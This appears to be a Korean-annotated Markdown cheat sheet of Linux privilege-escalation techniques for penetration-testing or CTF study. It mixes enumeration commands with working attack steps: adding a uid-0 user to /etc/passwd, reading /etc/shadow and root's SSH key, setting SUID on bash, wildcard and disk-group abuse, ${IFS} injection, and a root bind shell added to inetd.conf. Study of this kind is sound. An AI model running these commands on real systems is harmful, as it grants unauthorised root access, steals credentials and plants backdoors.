# Linux Privilege Escalation

## Add New Root User
```bash
# 패스워드 해시 생성
openssl passwd mrcake
# Output: hKLD3431415ZE

# /etc/passwd에 새로운 root 사용자 추가
echo "root2:hKLD3431415ZE:0:0:root:/root:/bin/bash" >> /etc/passwd

# root2로 전환
su root2
Password: mrcake 
```

---

## 시스템 정보 수집

### OS 정보 확인
```bash
cat /etc/issue
cat /etc/os-release
uname -a

cat /etc/shadow
cat /proc/self/cmdline
```

### 프로세스 및 네트워크 상태 확인
```bash
ps aux
ifconfig

# 무선 네트워크 인터페이스 정보와 설정 확인
iw dev

routel
ss -anp

# IPv4 iptables 방화벽 규칙 확인
cat /etc/iptables/rules.v4
```

### Cron 작업 확인
```bash
ls -al /etc/cron*
sudo crontab -l
```

### 패키지 목록 조회
```bash
dpkg -l
```

### 쓰기 가능한 파일 및 디렉토리 찾기
```bash
find / -writable -type d 2>/dev/null
find /etc -writable -type f 2>/dev/null
find /usr -writable -type f 2>/dev/null
find /var -writable -type f 2>/dev/null
```

### 마운트 및 디스크 정보 조회
```bash
# 부팅 시 자동 마운트되는 파일 시스템 정보 확인
cat /etc/fstab

mount

# 블록 디바이스(디스크, 파티션) 정보 출력
lsblk
```

### 커널 모듈 정보
```bash
# 현재 로드된 커널 모듈 목록 표시
lsmod

# 특정 커널 모듈의 상세 정보 확인
/sbin/modinfo libata
```

### SUID/SGID 파일 찾기
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -6000 -type f 2>/dev/null
```

### Capabilities 확인
```bash
/usr/sbin/getcap -r / 2>/dev/null
```

### Sudo 권한 확인
<img width="1106" height="131" alt="image" src="https://github.com/user-attachments/assets/b532742c-c518-4932-b5b2-4f829f2ef0e5" />

- `env_reset` : `sudo`실행시 환경변수 초기화
- `SETENV:` : 환경변수 전달 가능.

---

## Linux Exploit Suggester
- https://github.com/The-Z-Labs/linux-exploit-suggester
- 예전 버전 리눅스 취약점 발견에 용이

---

## Disk Group Privilege Escalation
- https://www.hackingarticles.in/disk-group-privilege-escalation/
- `disk` 그룹은 로우 블록 디바이스(예: `/dev/sda`, `/dev/nvme0n1p2`)에 접근할 수 있음

```bash
# 현재 마운트된 파일시스템의 디스크 사용량 확인
df -h
```
<img width="689" height="248" alt="image" src="https://github.com/user-attachments/assets/96e0cff6-b9f2-4624-9c36-417a71ddac0c" />

```bash
# 파일시스템의 내부 구조를 조작하거나 디버깅
debugfs /dev/sda3

# readonly로 설정되어 있으면 아래 명령 실행
mkdir test

# SSH 개인키 읽기
cat /root/.ssh/id_rsa
```

---

## rpc.py Exploit
- https://github.com/abersheeran/rpc.py
- https://www.exploit-db.com/exploits/50983

---

## Makefile Privilege Escalation
<img width="706" height="636" alt="image" src="https://github.com/user-attachments/assets/553e10b6-f5d7-4494-b3da-94c3167651d4" />

- https://medium.com/@adamforsythebartlett/makefile-privilege-escalation-oscp-62ea2c666d23

---

## System CTL
```bash
# nginx 서비스 유닛 내용 보기
systemctl cat nginx.service
```

---

## 7z Wildcard Exploit
```bash
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
- https://chinnidiwakar.gitbook.io/githubimport/linux-unix/privilege-escalation/wildcards-spare-tricks

---

## Tar Wildcard Exploit
<img width="675" height="350" alt="image" src="https://github.com/user-attachments/assets/af27b485-c6fb-4ab7-9b35-b2e20a5f01fa" />

- https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa


---

## Set SUID
```bash
chmod +s /bin/bash
```

---

## SSH
- authorized_keys를 변경할 수 있으면 변경

---

## 공유 라이브러리 취약점
```bash
# 실행 파일이 사용하는 공유 라이브러리 확인
ldd /usr/bin/log-sweeper
```

```bash
# 공유 라이브러리 만들기
gcc -shared -fPIC ex.c -o ex.so
```

---

## Linux White Space
```bash
${IFS}
```

---

## Linux Path Variables 설정
```bash
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

---

## 리버스 셸 연결이 안될 때
- nc/bash/python3 등 리버스 연결이 되지 않는다면 elf 파일 혹은 exe 파일을 만들어서 전달해서 실행시켜보기
- 리스닝 포트를 well known 포트(80,443 등)로 바꿔서 받아보기

---

## inetd.conf (옛날 리눅스 환경)
```bash
echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf
```
- 31337번 포트로 바인드 셸 연결
